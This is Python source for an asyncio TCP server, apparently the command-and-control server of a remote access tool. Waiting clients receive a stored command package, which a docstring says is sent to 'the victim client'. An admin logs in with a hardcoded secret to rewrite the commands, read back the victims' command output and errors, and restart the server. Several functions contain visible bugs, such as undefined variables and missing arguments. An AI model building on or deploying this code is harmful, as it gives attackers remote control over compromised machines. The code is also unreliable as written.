import socket    
import asyncio
from json import dumps,loads
from secrets import compare_digest
from datetime import datetime
from os import execl
from sys import executable
import hmac
# server
IDN = 'xmsalxaca8cac3cac9vr8gvr2br9bbn2n'
CODECS_FLE = {
    '0x00':{'HEADER':'0x00','CONTENT':'{result}','FLAG':'0x00'},
    '0x01':{'HEADER':'0x01','CONTENT':'{error}'},
    '0X02':{'HEADER':'0X02','CONTENT':'null'},
    '0X04':{'HEADER':'0X04','CONTENT':'null'},
    '0x06':{'HEADER':'0x06','CONTENT':None,'GUID':None},# comand
    '0x07':{'HEADER':'0x07','CONTENT':'{socket}'},
    '0x08':{'HEADER':'0x08','CONTENT':'{socket}'},
    '0x09':{'HEADER':'0x09','CONTENT':'null'},
    '0x10':{'HEADER':'0x10','IDN':'{IDN}'},
    '0x11':{'HEADER':'0x11','CONTENT':'{content}'},
    '0x17':{'HEADER':'0x17'}
    
}
ERRORS_FLE = [ x for n,x in enumerate(CODECS_FLE.keys()) if n <= 5]
IDN = '829HNDKMLSM09xmakcankancjkanc0iqwucbau'
class SGhiosProtocol(asyncio.Protocol):
    file = CODECS_FLE.get('0x06')# dict:[str,str]
    file['CONTENT'] = None
    STDERR = dict()
    STDOUT = dict()
    MAX_TRYS = 2
    MAX_SESSION_TIME = 50# seconds
    
    def __init__(self):
        self.ERRORS = {
            'connection':{'HEADER':'0x01','CONTENT':'connection time out {content}','Flag':'0x10'},
            'login':{'HEADER':'0x01','CONTENT':'IDN ERROR {content} ','FLAG':'0x10'},
            'unlogged':{'HEADER':'0x01','CONTENT':'USER NOT LOGGED {content}','FLAG':'0x13'},
            'writeError':{'HEADER':'0x01','CONTENT':'ERROR WRITING CONTENT \n specs {content}','FLAG':'0x11'},
            'command':{'HEADER':'0x01','CONTENT':'{content}','Flag':'0x06'}
        }
        self._transport:asyncio.BaseTransports = None
        self._out = ''
        self._err = ''
        self._ReadyConnections:dict[str,asyncio.BaseTransport] = dict()# pool of ready connections
        # self._adminConnections = dict()
        # requests of admin client 
        # no se mezclan las peticiones
        self._bloquedIp = []# attacks
        self._CounterTrys = dict()
        # dict of counter trys {'transport name':trys}
        # {'hommelander':3}
        self._Sessions = dict()
        # this dict will use for 
        # save the connection logeds and 
        self.stringfyJSON = lambda dict: dumps(dict).encode('utf-8')
    
    def onSucress(self,content,flag,extra:dict[str,str]=None):
        cc = CODECS_FLE.get('0x00')
        cc['CONTENT'] = content
        cc['FLAG'] = flag
        if extra:
            cc.update(extra)
            # upgrade the dict
        self._transport.write(self.stringfyJSON(cc))
        # sends the good news to the server
    
    def sendError(self,key,content=None,extra:dict[str,str]=None):
        '''
        extra extra content error like guid or something 
        '''
        if content:
            # if we needs to write some content error
            err:dict[str,str] = self.ERRORS.get(key,None)
            err['CONTENT'] = err['CONTENT'].format(content=content)
            # XXX: possible bug warning here!
            if extra:
                err.update(extra)
            self._transport.write(self.stringfyJSON(err))
        else:
            self._transport.write(self.stringfyJSON(self.ERRORS.get(key)))
    def sendExecuteCommand(self):
        '''
        this method will read a file (vareable) and sends the content
        the file includes a package to send for example
        {"HEADER":'0x06','CONTENT':"hello !"}'''
        self._transport.write(self.stringfyJSON(SGhiosProtocol.file))
    def onSucressRequest(self,package:dict[str,str],callback,flag,*args,**kwargs):
        # this function will be used for merge a sucress content
        # if the flag is the sance of the content flag
        # then we will call the function
        
        if package.get('FLAG') == flag and package.get('HEADER') == '0x00':
            callback(*args,**kwargs)
    def onErrorRequest(self,package:dict[str,str],callback,flag,*args,**kwargs):
        if package.get('FLAG') == flag and package.get('HEADER') == '0x01':
            callback(*args,**kwargs)
            
    def addToCounterTransport(self):
        ''' 
        this method will add the self._transport to a
        CounterTransport atribute to calculate how many attemps
        have left
        '''
        self._CounterTrys[self._transport.get_extra_info('peername')[0]] = SGhiosProtocol.MAX_TRYS
    
    
    def closeAllConnections(self):
        ''' cierra todas las conexiones listas '''
        for key,x in self._ReadyConnections.items():
            if not(x.is_closing()):
                x.close()# kill them
                
    def RefreshConnection(self):
        ''' this method will check if the connection still alive 
        and will drop the connections what are closed of the ReadyConnections attribute '''
        for x in self._ReadyConnections.keys():
            if self._ReadyConnections[x].is_closing():
                del self._ReadyConnections[x]

    def checkTimeOutSession(self):
        ''' this method will check if some Session expires 
        or if the connection was closed ''' 
        for key,x in self._Sessions.items():
            if x[0].is_closing():
                # delete them
                #del self._Sessions[key]
                self.removeLoggingSession(connection_name=key)
            if SGhiosProtocol.MAX_SESSION_TIME - x[1].minute == 0:
                # si es cero la sesion expiro 
                #del self._Sessions[key]
                self.removeLoggingSession(connection_name=key)
                # lo eliminamos
                x[0].close()
                # cerramos la conexion
                # enviamos un error de tiempo agotado
                self.sendError(key=CODECS_FLE.get('0x10'))
                 
    def saveLoggingSession(self):
        ''' 
        this method will save the connection made with the admin
        and save a time of logging  
        
        '''
        self._Sessions[self._transport.get_extra_info('peername')[0]] = [self._transport,datetime.now()]
    def removeLoggingSession(self,connection_name:asyncio.BaseTransport):
        ''' this method will delete some session of the dicts sessions file '''
        del self._Sessions[connection_name.get_extra_info('peername')[0]]
    def removeCurrentSession(self,connection_name:asyncio.BaseTransport):
        ''' this method will delete the current session of the dicts sessions file '''
        del self._Sessions[connection_name.get_extra_info('peername')[0]]
    
    def removeCunterTrys(self):
        '''
        this method will remove the connection from the counterTrys
        used if the user has logging succressful
        ''' 
        '''
        try:
            del self._CounterTrys[self._transport.get_extra_info('peername')[0]]
        except:
            pass
            #print('no saved !')
        '''

        dct = self._CounterTrys.get(self._transport.get_extra_info('peername')[0],None)
        if dct != None:
            del self._CounterTrys[self._transport.get_extra_info('peername')[0]]
        
        # less try except 
    def decrementTry(self,connection_name:str):
        ''' this method will decrement the number of trys of a connection '''
        #buff = self._CounterTrys[connection_name]
        if self._CounterTrys[connection_name] > 0:
        
            self._CounterTrys[connection_name] -= 1
        else:
            raise NameError('UNDECREMENT ERROR')
        
    def checkIfIsZeroCounter(self,connection_name:str):
        buff = self._CounterTrys.get(connection_name)
        if isinstance(buff,int):
            if buff == 0:
                return True
            else:
                # si no es falso
                return False

        # si no esta logeado es None
        return None
    def addToBloquedIP(self):
        self.removeCunterTrys()
        # drop the connection name of the counter trys
        self._bloquedIp.append(self._transport.get_extra_info('peername')[0])
        # add to a bloqued ip list
    def onLogin(self,package:dict[str,str]):
        ''' on package 0x10 start the auth process 
        [CLIENT ADMIN] -> [SERVER] - (PACKAGE WITH HEADER 0X10) -- LOGIN
        IF [SERVER] - (PACKAGE WITH HEADER 0X01 (ERROR ?)) -> [CLIENT ADMIN ]-- IF THE IDN ITS INCORRECT 
            ! > SERVER SIDE ADD THE TRANSPORT TO A POOL OF ADMIN COMMUNICATIONS 
            ! > SERVER SIDE COUNTER OF TRYS WHAT THE USER CAN MAKE FOR LOGIN DECREMENTS
            ! > IF THE SERVER SIDE COUNTER ITS EQUAL TO ZERO THEN THE SERVER ADD THE IP TO A BAD GUYS LIST
        
        this method return a bool result
        True -> the connection 
        '''
        #print(self._CounterTrys)
        if package.get('HEADER') == '0x10':
            zero = self.checkIfIsZeroCounter(connection_name=self._transport.get_extra_info('peername')[0])
            #print(zero)
            if not(zero):
                # if not is zero
                #print(True)
                if compare_digest(IDN,package.get('IDN')):
                    # compare if the IDN ITS THE SANCE 
                    # if its the sance start the session time counter

                    # will call save login for save the connection
                    # and remove it form counter trys

                    self.saveLoggingSession()
                    #print(self._Sessions)
                    self.removeCunterTrys()
                    #print(self._CounterTrys)
                    # we save a time of loging inside the saveLogin
                    
                    # we send a succressful message to the
                    # client notified what now its logged
                    
                    self.onSucress(content=True, flag='0x10')
                    
                    # start decrement time to live sesson!
                else:
                    if self._CounterTrys.get(connection_name,None):
                        # si no se encuentra se a;ade
                        self.addToCounterTransport()
                        # enviamos mensaje de error
                    else:
                        self.decrementTry(connection_name=self._transport.get_extra_info('peername')[0])
                    # decrements and send a error messaje
                    self.sendError(key='login')
            elif zero:
                # add to bad's guy list
                self.addToBloquedIP()
                self._transport.close()
                # closes the connection
                #print(self._bloquedIp)
            
            elif (zero == None):
                self.addToCounterTransport()
                #self.sendError(key='login')
                # try error
                # cerramos la conexion despues de a;adir
                # enviamos error y cerramos
                self._transport.close()
    def closeVoluntuaryAdminSession(self):
        ''' this method will close the admin session 
        use it if the client sends a package 0x02

        -- CLOSE THE CONNECTION 
        -- VOLUNTUARY (WHEN THE ADMIN CLIENT SENDS A SIGNAL OF EXIT)
        [CLIENT ADMIN] -> [SERVER] - (PACKAGE WITH HEADER 0X02)
        [CLIENT ADMIN] - (PACKAGE WITH HEADER 0X02) <- [SERVER]
        s'''
        self._transport.write(self.stringfyJSON(CODECS_FLE.get('0x02')))
        # remove from Session dictonary
        self.removeCurrentSession(self._transport)
    def restartServer(self):
        ''' this function will closes the execution of the server and re execute the script ''' 
        execl(executable,'python',f'{__file__}')# the python file
    
    def onWaitingConnection(self,package:dict[str,str]):
        if package.get('HEADER') == '0x09':
            # new connection
            self._ReadyConnections[self._transport.get_extra_info('peername')[0]] = self._transport
        
    def startConnection(self):
        # 0x04 new connection
        # 0x09 waiting
        # this method will check if the connection issnot in the bad guys ip's 
        if self._transport.get_extra_info('peername')[0] in self._bloquedIp:
            self._transport.close()
            print('conexion bloqueada')
            # closes the connection
    
            
            
    def check_codec(self,codec:str) -> bool:
        '''
        checa si el codigo esta en el codecs file
        '''
        if CODECS_FLE.get(codec,None):
            return True
        return False
    
    def connection_made(self, transport):
        '''
        esto permitira preocuparnos menos por el medio y mas por el protocolo 
        con el metodo write escribimos en el protocolo de tranposrte sea el que sea
        el mensaje
        
        todos los metodos se mandaran a llamar despeus de la conexion entrante
        '''
        # self.out = 
        #print(f" conexion entrante {transport.get_extra_info('peername')[0]}")
        self._transport = transport
        self.startConnection()
        # check if it isnnot in the bad guys list's
    def data_received(self, data):
        '''
        funcion que se ejecutara si se recibe un dato
        HEADER:
            CODEC_FLE
        CONTENT:
            CONTENT
        '''
        
        print('data',data.decode('utf-8'))
        ddt = loads(data.decode('utf-8'))
        dd = ddt.get('HEADER')
        
        if dd in ERRORS_FLE:
            self.err = CODECS_FLE.get(dd)
        else:
            self.out = CODECS_FLE.get(dd)
        self.analyserThram(ddt)
        #print(self._ReadyConnections)
    def checkIfItsLogged(self,callback,**kwargs):
        ''' this function will check if the user was logged 
        in session dictonary 
        if its logged execute a function callback
        if its not logged then send a error message
        '''
        session =  self._Sessions.get(self._transport.get_extra_info('peername')[0],None)
        if session != []:
            return callback(**kwargs)
        self.sendError(key='unlogged')
        # send error and closes the connection
        return self._transport.close()
        #return False
    def checkSessonExpired(self)->bool:
        ''' this functin will check if the session was not expired 
        if it was expired then remove the connection name of sessions dict and return true 
        if isnnot the case then return false'''
         
        if SGhiosProtocol.MAX_SESSION_TIME - self._Sessions.get(self._transport.get_extra_info('peername')[0])[1].minute == 0:
            self.removeCurrentSession() 
            return True
        return False
    def writeContentFile(self,data:dict[str,str]):
        ''' this method will set the content of file 
        this file its a class vareable and in it defines the commands what 
        will send to the victim client '''
        if not(self.checkSessonExpired()):
            # if false s
            try:
                if data.get('FLAG',None) == '0x22':
                    # if flag 0x22 then re write data
                    #
                    SGhiosProtocol.file = data['CONTENT']
                else:
                    SGhiosProtocol.file['CONTENT'] =  data.get('CONTENT').get('CONTENT')
                self.onSucress(content='SUCRESS WRITING DATA', flag='0x11')
                #print(SGhiosProtocol.file)
            except Exception as e:
                #print(e)
                self.sendError(key='writeError',content=e)
                # closes the connection
            finally:
                self._transport.close()
    def setCommandError(self,data:dict[str,str]):
        if data.get('CONTENT') != {}:
            SGhiosProtocol.STDERR = data
            # add a time attribute and the ip dirrecion
            SGhiosProtocol.STDERR['TIME'] = str(datetime.now())
            SGhiosProtocol.STDERR['IP'] = self._transport.get_extra_info('peername')[0]        
    def sendCommandError(self):
        ''' sends to the admin client the incorrect execution of some command ''' 
        
        #self.sendError(key='command',extra=SGhiosProtocol.STDERR)
        self._transport.write(self.stringfyJSON(SGhiosProtocol().STDERR))
    def setSucress(self,data:dict[str,str]):
        ''' this function will set into stdout the sucress execution of the command to the admin client 
        only if the content its different to {}''' 
        if data.get('CONTENT') != {}:
            SGhiosProtocol.STDOUT = data
        
    def sendCommandSuccress(self):
        self.onSucress(content=SGhiosProtocol.STDOUT,flag='0x06')
    def sucress_analyzer(self,data:dict[str,str]):
        #print('suc')
        match data.get('FLAG'):
            case '0x06':
                #print(data)
                #print('si')
                self.setSucress(data)
        pass
        
    def error_analyzer(self,data:dict[str,str]):
        ''' this function will analyze the data tram error ''' 
        match data.get('FLAG'):
            case '0x06':
                self.setCommandError(data)
                # sets the STDERR flag with the content of the error
    def eof_received(self):
        self._transport.close()
    def restartProtocol(self):
        # sends the sucressful message
        self.onSucress(content='Succressful restart \n wait', flag='0x17')
        # closes the session with the admin
        self.closeVoluntuaryAdminSession()
        self.restartServer()
    def analyserThram(self,data:dict[str,str]):
        #print(data)
        match data.get('HEADER'):
            case '0x09':
                self.onWaitingConnection(data)
                self.sendExecuteCommand()
                #self.eof_received()
                # enviamos datos y esperamos cierre de conexion por parte del ususario conexion
                #self._transport.close()
            case '0x00':
                # succress
                #print('data sucress' + data)
                self.sucress_analyzer(data)
                self.eof_received()
            case '0x01':
                # SI SE ENVIA UN ERROR POR PARTE DEL CLIENTE SE SOBRE ESCRIBIRA EL VALOR 
                # DE STDERR DE SG 
                self.error_analyzer(data)
                self.eof_received()
            
            case '0x10':
                #print(self._transport.get_extra_info('peername'))
                self.onLogin(package=data)
                #print(self._CounterTrys)
                #self._transport.close()
                #self.onLogin(package=data)
                #self.eof_received()
            case '0x11':
                # print('stats')
                self.checkIfItsLogged(self.writeContentFile,data=data)
                # kwargs its the args of the callback function
                #print(SGhiosProtocol.file)
                pass
            case '0x02':
                # closes the admin session
                self.closeVoluntuaryAdminSession()
            case '0x15':
                print('send')
                self.sendCommandError()
                self.eof_received()# close the connection
                # 0x15 request of errors
            case '0x16':
                self.sendCommandSuccress()
                self.eof_received()
            case '0x17':
                print('restarting server')
                self.checkIfItsLogged(callback=self.restartProtocol)
        #print(SGhiosProtocol.STDOUT)
        pass

class Server:
    def __init__(self,port,serverName=socket.gethostname()):
        self.serverName = serverName
        self.port = port 

    async def _execute(self,lp:asyncio.AbstractEventLoop,dirs:tuple[str,int]):
        '''
        dependiendo del metodo usado en el loop.create sera upd o tcp 
        
        
        '''
        pass 

    async def main_loop(self):
        lp = asyncio.get_running_loop()
        on_con_lost = lp.create_future()
        server = await self._execute(lp,(self.serverName,self.port))
        
        async with server:
            await server.serve_forever()
                
             
    def run(self):
        '''
        corre el servidor
        '''
        asyncio.run(self.main_loop())
class TCP_Server(Server):
    def __init__(self, port,serverName=None):
        self.proto_instance = SGhiosProtocol()
        if serverName == None:
        
            super().__init__(port)
        else:
            super().__init__(port,serverName=serverName)
        
        self.run()
    async def _execute(self,lp:asyncio.AbstractEventLoop,dirs:tuple[str,int]):
        return await lp.create_server(lambda : self.proto_instance,host=dirs[0],port=dirs[1])
#class UPD(Server):
#    def __init__(self):
#        super().__init__(self)
#        pass
#    
if __name__ == '__main__':
    print(f'starting serving at {socket.gethostname()} on 7777')
    TCP_Server(port=7777)